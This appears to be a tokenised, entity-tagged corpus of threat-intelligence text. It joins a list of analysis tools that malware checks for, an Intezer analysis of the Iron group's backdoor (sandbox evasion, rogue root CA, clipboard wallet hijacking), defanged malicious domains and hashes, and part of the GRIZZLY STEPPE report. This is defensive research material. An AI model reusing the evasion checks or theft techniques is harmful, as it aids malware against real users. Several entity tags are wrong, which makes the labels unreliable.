hxxp://www.alinn-u-yin[.]com//db_template.php B_url.unknown
hxxps://www.allin-chain[.]com//db_template.php B_url.unknown
hxxps://www.anatapackaging[.]com/vendors/db_template.php B_url.unknown
hxxp://alexcelts[.]com/wp/db_template.php B_url.unknown
hxxp://www.allstylus[.]com.br//db_template.php B_url.unknown
hxxp://www.algom-law[.]com//db_template.php B_url.unknown
hxxp://ambiances-toiles[.]fr//db_template.php B_url.unknown

Appendix

Security
Tools
Checked
on
the
Machine
win32_remote
win64_remote64
ollydbg

ProcessHacker
tcpview
autoruns
autorunsc
filemon
procmon

regmon
regmon
procexp
idaq
idaq64

ImmunityDebugger

Wireshark
dumpcap

HookExplorer

ImportREC

PETools

LordPE
dumpcap

SysInspector
proc_analyzer
sysAnalyzer
sniff_hit
windbg
joeboxcontrol
joeboxserver

This
entry
was
posted
on
Tue
Mar
13
12:15
EDT
2018
and
filed
under
Yogesh
Londhe
,

Dileep
Kumar
Jallepalli
,
Ben
Read
,
Iran
,
Spear B_malware.drop
Phishing  I
,
and
Sudeep
Singh
.

Sign
up
for
email
updates

Get
information
and
insight
on
today's
advanced
threats
from
the
leader
in
advanced
threat
prevention
.

First
Name

Last
Name

Email
Address

Company
Name

Threat
Research
Blog

Products
and
Services

Blog

Executive
Perspectives

Blog

SUBSCRIBE

Company

Company

About
FireEye

Customer
Stories

Careers

Partners

Investor
Relations

Supplier
Documents

New
s
and
Events

New
s
and
Events

Newsroom

Press
Releases

Webinars

Events

Awards
and
Honors

Email
Preferences

Technical
Support

Technical
Support

Incident
?

Report
Security
Issue

Contact
Support

Customer
Portal

Communities

Documentation
Portal

FireEye
Blogs

FireEye
Blogs

Threat
Research

Products
and
Services

Executive
Perspectives

Threat
Map

Threat
Map

View
the
Latest
Threats

Contact
Us

Contact
Us
+1
877-347-3393

Stay
Connected

Stay
Connected











Copyright
©
2018
FireEye
,
Inc
.
All
rights
reserved
.

Privacy
&
Cookies
Policy
|
Privacy
Shield
|
Legal
Documentation

Site
Language

English

Home

Products
&
Services

Technology

Company

Blog

Resources

Try
it
now

Blog

Cybersecurity
DNA

Iron
Cybercrime
Group
Under
The
Scope

Omri
Ben
Bassat
29.05.18
|
11:53
am

Share
:

In
April
2018
,
while
monitoring
public
data
feeds
,
we
noticed
an
interesting
and
previously
unknown
backdoor
using
HackingTeam's
leaked
RCS
source
code
.

We
discovered
that
this
backdoor
was
developed
by
the
Iron
cybercrime
group
,
the
same
group
behind
the

Iron
ransomware
(
rip-off
Maktub
ransomware
recently
discovered
by
Bart
Parys
)
,
which
we
believe
has
been
active
for
the
past
18
months
.

During
the
past
year
and
a
half
,
the
Iron
group
has
developed
multiple
types
of
malware
(
backdoors
,
crypto-miners
,
and
ransomware
)
for
Windows
,
Linux
and
Android
platforms
.

They
have
used
their
malware
to
successfully
infect
,
at
least
,
a
few
thousand
victims
.

In
this
technical
blog
post
we
are
going
to
take
a
look
at
the
malware
samples
found
during
the
research
.

Technical
Analysis
:
Installer
:

**
This
installer
sample
(
and
in
general
most
of
the
samples
found
)
is
protected
with
VMProtect
then
compressed
using
UPX
.

Installation
process
:

1
.
Check
if
the
binary
is
executed
on
a
VM
,
if
so
–
ExitProcess
.

2
.
Drop
&
Install
malicious
chrome
extension
%localappdata%\Temp\chrome.crx
.

3
.
Extract
malicious
chrome
extension
to
%localappdata%\Temp\chrome
&
create
a
scheduled
task
to
execute
%localappdata%\Temp\chrome\sec.vbs
.

4
.
Create
mutex
using
the
CPU's
version
to
make
sure
there's
no
existing
running
instance
of
itself
.

5
.
Drop
backdoor
dll
to
%localappdata%\Temp\\<random>.dat
.

6
.
Check
OS
version
:

.If
Version
==
Windows
XP
then
just
invoke
'
Launch
'
export
of
Iron
Backdoor
for
a
one-time
non
persistent
execution
.

.If
Version
>
Windows
XP
-Invoke
'
Launch
'
export
-Check
if
Qhioo360
–
only
if
not
proceed
,
Install
malicious
certificate
used
to
sign
Iron
Backdoor
binary
as
root
CA.Then
create
a
service
called
'
helpsvc
'
pointing
back
to
Iron
Backdoor
dll
.

Using
the
leaked
HackingTeam
source
code
:

Once
we
Analyzed
the
backdoor
sample
,
we
immediately
noticed
it's
partially
based
on
HackingTeam's
source
code
for
their
Remote
Control
System
hacking
tool
,
which
leaked
about
3
years
ago
.

Further
analysis
showed
that
the
Iron
cybercrime
group
used
two
main
functions
from
HackingTeam's
source
in
both
IronStealer B_malware.infosteal
and
Iron  B_malware.ransom
ransomware  I
.

1.Anti-VM
:
Iron  B_malware.backdoor
Backdoor  I
uses
a
virtual
machine
detection
code
taken
directly
from
HackingTeam's
'
Soldier
'
implant
leaked
source
code
.

This
piece
of
code
supports
detecting
Cuckoo
Sandbox
,
VMWare
product
&
Oracle's
VirtualBox
.

Screenshot
:
2
.
Dynamic
Function
Calls
:
Iron  B_malware.backdoor
Backdoor  I
is
also
using
the
DynamicCall
module
from
HackingTeam's
'
core
'
library
.

This
module
is
used
to
dynamically
call
external
library
function
by
obfuscated
the
function
name
,
which
makes
static
analysis
of
this
malware
more
complex
.

In
the
following
screenshot
you
can
see
obfuscated
'
LFSOFM43/EMM
'
and
'
DsfbufGjmfNbqqjohB
'
,
which
represents
'
kernel32.dll
'
and
'
CreateFileMappingA
'
API
.

For
a
full
list
of
obfuscated
APIs
you
can
visit
obfuscated_calls.h.

Malicious
Chrome
extension
:

A
patched
version
of
the
popular
Adblock
Plus
chrome
extension
is
used
to
inject
both
the
in-browser
crypto-mining
module
(
based
on
CryptoNoter
)
and
the
in-browser
payment
hijacking
module
.

**patched
include.preload.js
injects
two
malicious
scripts
from
the
attacker's
Pastebin
account
.

The
malicious
extension
is
not
only
loaded
once
the
user
opens
the
browser
,
but
also
constantly
runs
in
the
background
,
acting
as
a
stealth
host
based
crypto-miner
.

The
malware
sets
up
a
scheduled
task
that
checks
if
chrome
is
already
running
,
every
minute
,
if
it
isn't
,
it
will
'
silent-launch
'
it
as
you
can
see
in
the
following
screenshot
:

Internet
Explorer(deprecated
)
:

Iron  B_malware.backdoor
Backdoor  I
itself
embeds
adblockplusie
–
Adblock
Plus
for
IE
,
which
is
modified
in
a
similar
way
to
the
malicious
chrome
extension
,
injecting
remote
javascript
.

It
seems
that
this
functionality
is
no
longer
automatically
used
for
some
unknown
reason
.

Persistence
:

Before
installing
itself
as
a
Windows
service
,
the
malware
checks
for
the
presence
of
either
360
Safe
Guard
or
360
Internet
Security
by
reading
following
registry
keys
:
.SYSTEM\CurrentControlSet\Services\zhudongfangyu
.
.SYSTEM\CurrentControlSet\Services\360rp

If
one
of
these
products
is
installed
,
the
malware
will
only
run
once
without
persistence
.

Otherwise
,
the
malware
will
proceed
to
installing
rouge
,
hardcoded
root
CA
certificate
on
the
victim's
workstation
.

This
fake
root
CA
supposedly
signed
the
malware's
binaries
,
which
will
make
them
look
legitimate
.

Comic
break
:
The
certificate
is
protected
by
the
password
'
caonima123
'
,
which
means
'
f*ck
your
mom
'
in
Mandarin
.

IronStealer B_malware.infosteal
(
<RANDOM>.dat
)
:

Persistent
backdoor
,
dropper
and
cryptocurrency
theft
module
.

1
.
Load
Cobalt
Strike
beacon
:

The
malware
automatically
decrypts
hard
coded
shellcode
stage-1
,
which
in
turn
loads
Cobalt
Strike
beacon
in-memory
,
using
a
reflective
loader
:

Beacon
:
hxxp://dazqc4f140wtl.cloudfront[.]net/ZZYO  B_url.unknown

2
.
Drop
&
Execute
payload
:
The
payload
URL
is
fetched
from
a
hardcoded
Pastebin
paste
address
:

We
observed
two
different
payloads
dropped
by
the
malware
:

1
.
Xagent
–
A
variant
of
'
JbossMiner
Mining
Worm
'
–
a
worm
written
in
Python
and
compiled
using
PyInstaller
for
both
Windows
and
Linux
platforms
.

JbossMiner
is
using
known
database
vulnerabilities
to
spread
.

'
Xagent
'
is
the
original
filename
Xagent<VER>.exe
whereas
<VER>
seems
to
be
the
version
of
the
worm
.

The
last
version
observed
was
version
6
(
Xagent6.exe
)
.

**Xagent
versions
4-6
as
seen
by
VT
2
.
Iron  B_malware.ransom
ransomware  I
–
We
recently
saw
a
shift
from
dropping
Xagent
to
dropping
Iron  B_malware.ransom
ransomware  I
.

It
seems
that
the
wallet
&
payment
portal
addresses
are
identical
to
the
ones
that
Bart
observed
.

Requested
ransom
decreased
from
0.2
BTC
to
0.05
BTC
,
most
likely
due
to
the
lack
of
payment
they
received
.

**Nobody
paid
so
they
decreased
ransom
to
0.05
BTC

3
.
Stealing
cryptocurrency
from
the
victim's
workstation
:
Iron  B_malware.backdoor
backdoor  I
would
drop
the
latest
voidtool
Everything
search
utility
and
actually
silent
install
it
on
the
victim's
workstation
using
msiexec
.

After
installation
was
completed
,
Iron  B_malware.backdoor
Backdoor  I
uses
Everything
in
order
to
find
files
that
are
likely
to
contain
cryptocurrency
wallets
,
by
filename
patterns
in
both
English
and
Chinese
.

Full
list
of
patterns
extracted
from
sample
:
–
Wallet.dat
–
UTC–
–
Etherenum
keystore
filename
–
*bitcoin*.txt
–
*比特币*.txt
–
'
Bitcoin
'
–
*monero*.txt
–
*门罗币*.txt
–
'
Monroe
Coin
'
–
*litecoin*.txt

–
*莱特币*.txt
–
'
Litecoin
'
–
*Ethereum*.txt
–
*以太币*.txt
–
'
Ethereum
'
–
*miner*.txt
–
*挖矿*.txt
–
'
Mining
'
–
*blockchain*.txt
–
*coinbase*

4
.
Hijack
on-going
payments
in
cryptocurrency
:
IronStealer B_malware.infosteal
constantly
monitors
the
user's
clipboard
for
Bitcoin
,
Monero
&
Ethereum
wallet
address
regex
patterns
.

Once
matched
,
it
will
automatically
replace
it
with
the
attacker's
wallet
address
so
the
victim
would
unknowingly
transfer
money
to
the
attacker's
account
:

Pastebin
Account
:

As
part
of
the
investigation
,
we
also
tried
to
figure
out
what
additional
information
we
may
learn
from
the
attacker's
Pastebin
account
:

The
account
was
probably
created
using
the
mail
fineisgood123@gmail[.]com
–
the
same
email
address
used
to
register
blockbitcoin[.]com
(
the
attacker's
crypto-mining
pool
&
malware
host
)
and
swb[.]one
(
Old
server
used
to
host
malware
&
leaked
files
.

replaced
by
u.cacheoffer[.]tk
)
:

1
.
Index.html
:
HTML
page
referring
to
a
fake
Firefox
download
page
.

2
.
crystal_ext-min
+
angular
:
JS
inject
using
malicious
Chrome
extension
.

3
.
android
:
This
paste
holds
a
command
line
for
an
unknown
backdoored
application
to
execute
on
infected
Android
devices
.

This
command
line
invokes
remote
Metasploit
stager
(
android.apk
)
and
drops
cpuminer
2.3.2
(
minerd.txt
)
built
for
ARM
processor
.

Considering
the
last
update
date
(
18/11/17
)
and
the
low
number
of
views
,
we
believe
this
paste
is
obsolete
.

4
.
androidminer
:
Holds
the
cpuminer
command
line
to
execute
for
unknown
malicious
android
applications
,
at
the
time
of
writing
this
post
,
this
paste
received
nearly
2000
hits
.

Aikapool[.]com
is
a
public
mining
pool
and
port
7915
is
used
for

DogeCoin
:

The
username
(
myapp2150
)
was
used
to
register
accounts
in
several
forums
and
on
Reddit
.

These
accounts
were
used
to
advertise
fake
'
blockchain
exploit
tool
'
,
which
infects
the
victim's
machine
with
Cobalt
Strike
,
using
a
similar
VBScript
to
the
one
found
by
Malwrologist
(
ps5.sct
)
.

XAttacker
:
Copy
of
XAttacker
PHP
remote
file
upload
script
.

miner
:
Holds
payload
URL
,
as
mentioned
above
(
IronStealer B_malware.infosteal
)
.

FAQ
:

How
many
victims
are
there
?

It
is
hard
to
define
for
sure
,
,
but
to
our
knowledge
,
the
total
of
the
attacker's
pastes
received
around
14K
views
,
~11K
for
dropped
payload
URL
and
~2k
for
the
android
miner
paste
.

Based
on
that
,
we
estimate
that
the
group
has
successfully
infected
,
a
few
thousands
victims
.

Who
is
Iron
group
?

We
suspect
that
the
person
or
persons
behind
the
group
are
Chinese
,
due
in
part
to
the
following
findings
:
.

There
were
several
leftover
comments
in
the
plugin
in
Chinese
.

.
Root
CA
Certificate
password
(
'
f*ck
your
mom123
'
was
in
Mandarin
)

We
also
suspect
most
of
the
victims
are
located
in
China
,
because
of
the
following
findings
:
.

Searches
for
wallet
file
names
in
Chinese
on
victims
'
workstations
.

.
Won't
install
persistence
if
Qhioo360(popular
Chinese
AV
)
is
found

IOCS
:
blockbitcoin[.]com  B_url.unknown
pool.blockbitcoin[.]com  B_url.unknown
ssl2.blockbitcoin[.]com  B_url.unknown
xmr.enjoytopic[.]tk  B_url.unknown
down.cacheoffer[.]tk  B_url.unknown
dzebppteh32lz.cloudfront[.]net  B_url.unknown
dazqc4f140wtl.cloudfront[.]net  B_url.unknown
androidapt.s3-accelerate.amazonaws[.]com  B_url.unknown
androidapt.s3-accelerate.amazonaws[.]com  B_url.unknown
winapt.s3-accelerate.amazonaws[.]com  B_url.unknown
swb[.]one  B_url.unknown
bitcoinwallet8[.]com  B_url.unknown
blockchaln[.]info  B_url.unknown
6350a42d423d61eb03a33011b6054fb7793108b7e71aee15c198d3480653d8b7  B_hash
a4faaa0019fb63e55771161e34910971fd8fe88abda0ab7dd1c90cfe5f573a23  B_hash
ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9  B_hash
654ec27ea99c44edc03f1f3971d2a898b9f1441de156832d1507590a47b41190  B_hash
980a39b6b72a7c8e73f4b6d282fae79ce9e7934ee24a88dde2eead0d5f238bda  B_hash
39a991c014f3093cdc878b41b527e5507c58815d95bdb1f9b5f90546b6f2b1f6  B_hash
a3c8091d00575946aca830f82a8406cba87aa0b425268fa2e857f98f619de298  B_hash
0f7b9151f5ff4b35761d4c0c755b6918a580fae52182de9ba9780d5a1f1beee8  B_hash
ea338755e8104d654e7d38170aaae305930feabf38ea946083bb68e8d76a0af3  B_hash
4de16be6a9de62b1ff333dd94e63128e677eb6a52d9fbbe55d8a09a2cab161f1  B_hash
92b4eed5d17cb9892a9fe146d61787025797e147655196f94d8eaf691c34be8c  B_hash
6314162df5bc2db1200d20221641abaac09ac48bc5402ec29191fd955c55f031  B_hash
7f3c07454dab46b27e11fcefd0101189aa31e84f8498dcb85db2b010c02ec190  B_hash
927e61b57c124701f9d22abbc72f34ebe71bf1cd717719f8fc6008406033b3e9  B_hash
f1cbacea1c6d05cd5aa6fc9532f5ead67220d15008db9fa29afaaf134645e9de  B_hash
1d34a52f9c11d4bf572bf678a95979046804109e288f38dfd538a57a12fc9fd1  B_hash
2f5fb4e1072044149b32603860be0857227ed12cde223b5be787c10bcedbc51a  B_hash
0df1105cbd7bb01dca7e544fb22f45a7b9ad04af3ffaf747b5ecc2ffcd8c6dee  B_hash
388c1aecdceab476df8619e2d722be8e5987384b08c7b810662e26c42caf1310  B_hash
0b8473d3f07a29820f456b09f9dc28e70af75f9dec88668fb421a315eec9cb63  B_hash
251345b721e0587f1f08f54a81e26abac075acf3c4473a2c3ba8efcedc3b2459  B_hash
b1fe223cbb01ff2a658c8ff51d386b5df786fd36278ee081c714adf946145047  B_hash
2886e25a86a57355a8a09a84781a9b032de10c3e40339a9ad0c10b63f7f8e7c7  B_hash
1d17eb102e75c08ab6f54387727b12ec9f9ee1960c8e5dc7f9925d41a943cabf  B_hash
5831dabe27e0211028296546d4e637770fd1ec5f2c8c5add51d0ea09b6ea3f0d  B_hash
85b0d44f3e8fd636a798960476a1f71d6fe040fbe44c92dfa403d0d014ff66cc  B_hash
936f4ce3570017ef5db14fb68f5e775a417b65f3b07094475798f24878d84907  B_hash
484b4cd953c9993090947fbb31626b76d7eee60c106867aa17e408556d27b609  B_hash
1cbd51d387561cafddf10699177a267cd5d2d184842bb43755a0626fdc4f0f3c  B_hash
e41a805d780251cb591bcd02e5866280f8a99f876cfa882b557951e30dfdd142  B_hash
b8107197469839a82cae25c3d3b5c25b5c0784736ca3b611eb3e8e3ced8ec950  B_hash
b0442643d321003af965f0f41eb90cff2a198d11b50181ef8b6f530dd22226a7  B_hash
657a3a4a78054b8d6027a39a5370f26665ee10e46673a1f4e822a2a31168e5f9  B_hash
5977bee625ed3e91c7f30b09be9133c5838c59810659057dcfd1a5e2cf7c1936  B_hash
9ea69b49b6707a249e001b5f2caaab9ee6f6f546906445a8c51183aafe631e9f  B_hash
283536c26bb4fd4ea597d59c77a84ab812656f8fe980aa8556d44f9e954b1450  B_hash
21f1a867fa6a418067be9c68d588e2eeba816bffcb10c9512f3b7927612a1221  B_hash
45f794304919c8aa9282b0ee84c198703a41cc2254fe93634642ada3511239d2  B_hash
70e47fdff286fdfe031d05488bc727f5df257eacaa0d29431fb69ce680f6fb0c  B_hash
ce7161381a0a0495ef998b5e202eb3e8fa2945dfdba0fd2a612d68b986c92678  B_hash
b8d548ab2a1ce0cf51947e63b37fe57a0c9b105b2ef36b0abc1abf26d848be00  B_hash
74e777af58a8ee2cff4f9f18013e5b39a82a4c4f66ea3e17d06e5356085265b7  B_hash
cd4d1a6b3efb3d280b8d4e77e306e05157f6ef8a226d7db08ac2006cce95997c  B_hash
78a07502443145d762536afaabd4d6139b81ca3cc9f8c28427ec724a3107e17b  B_hash
729ab4ff5da471f210a8658f4a7b2a30522534a212ac44e4d76f258baab19ccb  B_hash
ca0df32504d3cf78d629e33b055213df5f71db3d5a0313ebc07fe2c05e506826  B_hash
fc9d150d1a7cbda2600e4892baad91b9a4b8c52d31a41fd686c21c7801d1dd8c  B_hash
bf2984b866c449a8460789de5871864eec19a7f9cadd7d883898135a4898a38a  B_hash
9d817d77b651d2627e37c01037e13808e1047f9528799a435c7bc04e877d70b3  B_hash
8fdec2e23032a028b8bd326dc709258a2f705c605f6222fc0c1616912f246f91  B_hash
dbe165a63ed14e6c9bdcd314cf54d173e68db9d36623b09057d0a4d0519f1306  B_hash
64f96042ab880c0f2cd4c39941199806737957860387a65939b656d7116f0c7e  B_hash
e394b1a1561c94621dbd63f7b8ea7361485a1f903f86800d50bd7e27ad801a5f  B_hash
506647c5bfad858ff6c34f93c74407782abbac4da572d9f44112fee5238d9ae1  B_hash
194362ce71adcdfa0fe976322a7def8bb2d7fb3d67a44716aa29c2048f87f5bc  B_hash
3652ea75ce5d8cfa0000a40234ae3d955781bcb327eecfee8f0e2ecae3a82870  B_hash
97d41633e74eccf97918d248b344e62431b74c9447032e9271ed0b5340e1dba0  B_hash
a8ab5be12ca80c530e3ef5627e97e7e38e12eaf968bf049eb58ccc27f134dc7f  B_hash
37bea5b0a24fa6fed0b1649189a998a0e51650dd640531fe78b6db6a196917a7  B_hash
7e750be346f124c28ddde43e87d0fbc68f33673435dddb98dda48aa3918ce3bd  B_hash
fcb700dbb47e035f5379d9ce1ada549583d4704c1f5531217308367f2d4bd302  B_hash
b638dcce061ed2aa5a1f2d56fc5e909aa1c1a28636605a3e4c0ad72d49b7aec6  B_hash
f2e4528049f598bdb25ce109a669a1f446c6a47739320a903a9254f7d3c69427  B_hash
afd7ab6b06b87545c3a6cdedfefa63d5777df044d918a505afe0f57179f246e9  B_hash
9b654fd24a175784e3103d83eba5be6321142775cf8c11c933746d501ca1a5a1  B_hash
e6c717b06d7ded23408461848ad0ee734f77b17e399c6788e68bc15219f155d7  B_hash
e302aa06ad76b7e26e7ba2c3276017c9e127e0f16834fb7c8deae2141db09542  B_hash
d020ea8159bb3f99f394cd54677e60fadbff2b91e1a2e91d1c43ba4d7624244d  B_hash
36104d9b7897c8b550a9fad9fe2f119e16d82fb028f682d39a73722822065bd3  B_hash
d20cd3e579a04c5c878b87cc7bd6050540c68fdd8e28f528f68d70c77d996b16  B_hash
ee859581b2fcea5d4ff633b5e40610639cd6b11c2b4fc420720198f49fbd1d31  B_hash
ef2c384c795d5ca8ce17394e278b5c98f293a76047a06fc672da38bb56756aec  B_hash
bd56db8d304f36af7cb0380dcbbc3c51091e3542261affb6caac18fa6a6988ec  B_hash
086d989f14e14628af821b72db00d0ef16f23ba4d9eaed2ec03d003e5f3a96a1  B_hash
f44c3fd546b8c74cc58630ebcb5bea417696fac4bb89d00da42202f40da31354  B_hash
320bb1efa1263c636702188cd97f68699aebbb88c2c2c92bf97a68e689fa6f89  B_hash
42faf3af09b955de1aead2b99a474801b2c97601a52541af59d35711fafb7c6d  B_hash
6e0adfd1e30c116210f469d76e60f316768922df7512d40d5faf65820904821b  B_hash
eea2d72f3c9bed48d4f5c5ad2bef8b0d29509fc9e650655c6c5532cb39e03268  B_hash
1a31e09a2a982a0fedd8e398228918b17e1bde6b20f1faf291316e00d4a89c61  B_hash
042efe5c5226dd19361fb832bdd29267276d7fa7a23eca5ced3c2bb7b4d30f7d  B_hash
274717d4a4080a6f2448931832f9eeb91cc0cbe69ff65f2751a9ace86a76e670  B_hash
f8751a004489926ceb03321ea3494c54d971257d48dadbae9e8a3c5285bd6992  B_hash
d5a296bac02b0b536342e8fb3b9cb40414ea86aa602353bc2c7be18386b13094  B_hash
49cfeb6505f0728290286915f5d593a1707e15effcfb62af1dd48e8b46a87975  B_hash
5f2b13cb2e865bb09a220a7c50acc3b79f7046c6b83dbaafd9809ecd00efc49a  B_hash
5a5bbc3c2bc2d3975bc003eb5bf9528c1c5bf400fac09098490ea9b5f6da981f  B_hash
2c025f9ffb7d42fcc0dc8d056a444db90661fb6e38ead620d325bee9adc2750e  B_hash
aaa6ee07d1c777b8507b6bd7fa06ed6f559b1d5e79206c599a8286a0a42fe847  B_hash
ac89400597a69251ee7fc208ad37b0e3066994d708e15d75c8b552c50b57f16a  B_hash
a11bf4e721d58fcf0f44110e17298f6dc6e6c06919c65438520d6e90c7f64d40  B_hash
017bdd6a7870d120bd0db0f75b525ddccd6292a33aee3eecf70746c2d37398bf  B_hash
ae366fa5f845c619cacd583915754e655ad7d819b64977f819f3260277160141  B_hash
9b40a0cd49d4dd025afbc18b42b0658e9b0707b75bb818ab70464d8a73339d52  B_hash
57daa27e04abfbc036856a22133cbcbd1edb0662617256bce6791e7848a12beb  B_hash
6c54b73320288c11494279be63aeda278c6932b887fc88c21c4c38f0e18f1d01  B_hash
ba644e050d1b10b9fd61ac22e5c1539f783fe87987543d76a4bb6f2f7e9eb737  B_hash
21a83eeff87fba78248b137bfcca378efcce4a732314538d2e6cd3c9c2dd5290  B_hash
2566b0f67522e64a38211e3fe66f340daaadaf3bcc0142f06f252347ebf4dc79  B_hash
692ae8620e2065ad2717a9b7a1958221cf3fcb7daea181b04e258e1fc2705c1e  B_hash
426bc7ffabf01ebfbcd50d34aecb76e85f69e3abcc70e0bcd8ed3d7247dba76e  B_hash

By
Omri
Ben
Bassat

Ex-officer
in
the
IDF-CERT
.
Malware
analyst
and
Reverse
Engineer
with
vast
experience
in
dealing
with
Nation-sponsored
cyber
attacks
.
|
omri@intezer.com

Tags
:
backdoor
bitcoin
cryptominer
cybercrime
malware
ransomware
china
iron

Share
:

Register
to
our
free
community

Try
it
now


Executable
And
Linkable
Format
101
Pa
...

Digital
Certificates-
When
The
Chain
Of
T
...

Home

Products

Intezer
AnalyzeTM

Compromise
Assessment

Technology

Company

About

News
and
Events

Intezer
Blog

Contact
©
Intezer.com
2017
All
rights
reserved

Terms
of

Privacy

Policy
JOINT
ANALYSIS
REPORT

DISCLAIMER
:
This
report
is
provided
'
as
is
'
for
informational
purposes
only
.

The
Department
of
Homeland
Security
(
DHS
)
does
not
provide
any
warranties
of
any
kind
regarding
any
information
contained
within
.

DHS
does
not
endorse
any
commercial
product
or
service
referenced
in
this
advisory
or
otherwise
.

This
document
is
distributed
as

:
Subject
to
standard
copyright
rules
,

information
may
be
distributed
without
restriction
.

For
more
information
on
the
Traffic
Light
Protocol
,
see
https://www.us-cert.gov/tlp
.

Reference
Number
:
JAR-16-20296A

December
29
,
2016

GRIZZLY
STEPPE
–
Russian
Malicious
Cyber
Activity

Summary

This
Joint
Analysis
Report
(
JAR
)
is
the
result
of
analytic
efforts
between
the
Department
of
Homeland
Security
(
DHS
)
and
the
Federal
Bureau
of
Investigation
(
FBI
)
.

This
document
provides
technical
details
regarding
the
tools
and
infrastructure
used
by
the
Russian
civilian
and
military
intelligence
Services
(
RIS
)
to
compromise
and
exploit
networks
and
endpoints
associated
with
the
U.S.
election
,
as
well
as
a
range
of
U.S.
Government
,
political
,
and
private
sector
entities
.

The
U.S.
Government
is
referring
to
this
malicious
cyber
activity
by
RIS
as
GRIZZLY
STEPPE
.

Previous
JARs
have
not
attributed
malicious
cyber
activity
to
specific
countries
or
threat
actors
.

However
,
public
attribution
of
these
activities
to
RIS
is
supported
by
technical
indicators
from
the
U.S.
Intelligence
Community
,
DHS
,
FBI
,
the
private
sector
,
and
other
entities
.

This
determination
expands
upon
the
Joint
Statement
released
October
7
,
2016
,
from
the
Department
of
Homeland
Security
and
the
Director
of
National
Intelligence
on
Election
Security
.

This
activity
by
RIS
is
part
of
an
ongoing
campaign
of
cyber-enabled
operations
directed
at
the
U.S.
government
and
its
citizens
.

These
cyber
operations
have
included
spearphishing B_malware.backdoor
campaigns
targeting
government
organizations
,
critical
infrastructure
entities
,
think
tanks
,
universities
,
political
organizations
,
and
corporations
leading
to
the
theft
of
information
.

In
foreign
countries
,
RIS
actors
conducted
damaging
and
/
or
disruptive
cyber
-
attacks
,
including
attacks
on
critical
infrastructure
networks
.

In
some
cases
,
RIS
actors
masqueraded
as
third
parties
,
hiding
behind
false
online
personas
designed
to
cause
the
victim
to
misattribute
the
source
of
the
attack
.

This
JAR
provides
technical
indicators
related
to
many
of
these
operations
,
recommended
mitigations
,
suggested
actions
to
take
in
response
to
the
indicators
provided
,
and
information
on
how
to
report
such
incidents
to
the
U.S.
Government
.

Description

The
U.S.
Government
confirms
that
two
different
RIS
actors
participated
in
the
intrusion
into
a
U.S.
political
party
.

The
first
actor
group
,
known
as
Advanced
Persistent
Threat
(
APT
)
29
,
entered
into
the
party's
systems
in
summer
2015
,
while
the
second
,
known
as
APT28 B_malware.backdoor
,
entered
in
spring
2016
.

Figure
1
:
The
tactics
and
techniques
used
by
APT29 B_malware.backdoor
and
APT
28
to
conduct
cyber
intrusions
against
target
systems
.

Both
groups
have
historically
targeted
government
organizations
,
think
tanks
,
universities
,
and
corporations
around
the
world
.

APT29 B_malware.backdoor
has
been
observed
crafting
targeted
spearphishing B_malware.backdoor
campaigns
leveraging
web
links
to
a
malicious
dropper
;
once
executed
,
the
code
delivers
Remote

Access
Tools
(
RATs  B_malware.backdoor
)
and
evades
detection
using
a
range
of
techniques
.

APT28 B_malware.backdoor
is
known
for
leveraging
domains
that
closely
mimic
those
of
targeted
organizations
and
tricking
potential
victims
into
entering
legitimate
credentials
.

APT28 B_malware.backdoor
actors
relied
heavily
on
shortened
URLs
in
their
spearphishing B_malware.backdoor
email
campaigns
.

Once
APT28 B_malware.backdoor
and
APT29 B_malware.backdoor
have
access
to
victims
,
both
groups
exfiltrate
and
analyze
information
to
gain
intelligence
value
.

These
groups
use
this
information
to
craft
highly
targeted
spearphishing B_malware.backdoor
campaigns
.

These
actors
set
up
operational
infrastructure
to
obfuscate
their
source
infrastructure
,
host
domains
and
malware
for
targeting
organizations
,
establish
command
and
control
nodes
,
and
harvest
credentials
and
other
valuable
information
from
their
targets
.

In
summer
2015
,
an
APT29 B_malware.backdoor
spearphishing B_malware.backdoor
campaign
directed
emails
containing
a
malicious
link
to
over
1,000
recipients
,
including
multiple
U.S.
Government
victims
.
APT29 B_malware.backdoor
used
legitimate
domains
,
to
include
domains
associated
with
U.S.
organizations
and
educational
institutions
,
to
host
malware
and
send
spearphishing B_malware.backdoor
emails
.

In
the
course
of
that
campaign
,
APT29 B_malware.backdoor
successfully
compromised
a
U.S.
political
party
.

At
least
one
targeted
individual
activated
links
to
malware
hosted
on
operational
infrastructure
of
opened
attachments
containing
malware
.

APT29 B_malware.backdoor
delivered
malware
to
the
political
party's
systems
,
established
persistence
,
escalated
privileges
,
enumerated
active
directory
accounts
,
and
exfiltrated
email
from
several
accounts
through
encrypted
connections
back
through
operational
infrastructure
.

In
spring
2016
,
APT28 B_malware.backdoor
compromised
the
same
political
party
,
again
via
targeted
spearphishing B_malware.backdoor
.

This
time
,
the
spearphishing B_malware.backdoor
email
tricked
recipients
into
changing
their
passwords
through
a
fake
webmail
domain
hosted
on
APT28 B_malware.backdoor
operational
infrastructure
.

Using
the
harvested
credentials
,
APT28 B_malware.backdoor
was
able
to
gain
access
and
steal
content
,
likely
leading
to
the
exfiltration
of
information
from
multiple
senior
party
members
.

The
U.S.
Government
assesses
that
information
was
leaked
to
the
press
and
publicly
disclosed
.

Figure
2
:
APT28's B_malware.backdoor
Use
of
spearphishing B_malware.backdoor
and
Stolen
Credentials

Actors
likely
associated
with
RIS
are
continuing
to
engage
in
spearphishing B_malware.backdoor
campaigns
,
including
one
launched
as
recently
as
November
2016
,
just
days
after
the
U.S.
election
.


Reported
Russian
Military
and
Civilian
Intelligence
Services
(
RIS
)

Alternate
Names

APT28 B_malware.backdoor

APT29 B_malware.backdoor

Agent.btz

BlackEnergy B_malware.backdoor
V3  I

BlackEnergy2  B_malware.backdoor
APT I

CakeDuke  B_malware.infosteal

Carberp B_malware.infosteal

CHOPSTICK B_malware.backdoor

CloudDuke B_malware.backdoor

CORESHELL B_malware.backdoor

CosmicDuke  B_malware.backdoor

COZYBEAR  B_malware.backdoor

COZYCAR B_malware.backdoor

COZYDUKE  B_malware.backdoor

CrouchingYeti B_malware.infosteal

DIONIS  B_malware.infosteal

Dragonfly B_malware.drop

Energetic B_malware.infosteal
Bear  I

EVILTOSS  B_malware.backdoor

Fancy B_malware.backdoor
Bear  I

GeminiDuke  B_malware.backdoor

GREY  B_malware.backdoor
CLOUD I

HammerDuke  B_malware.backdoor

HAMMERTOSS  B_malware.backdoor

Havex B_malware.backdoor

MiniDionis  B_malware.infosteal

MiniDuke  B_malware.backdoor

OLDBAIT B_malware.backdoor

OnionDuke B_malware.backdoor

Operation B_malware.backdoor
Pawn  I
Storm I

PinchDuke B_malware.infosteal

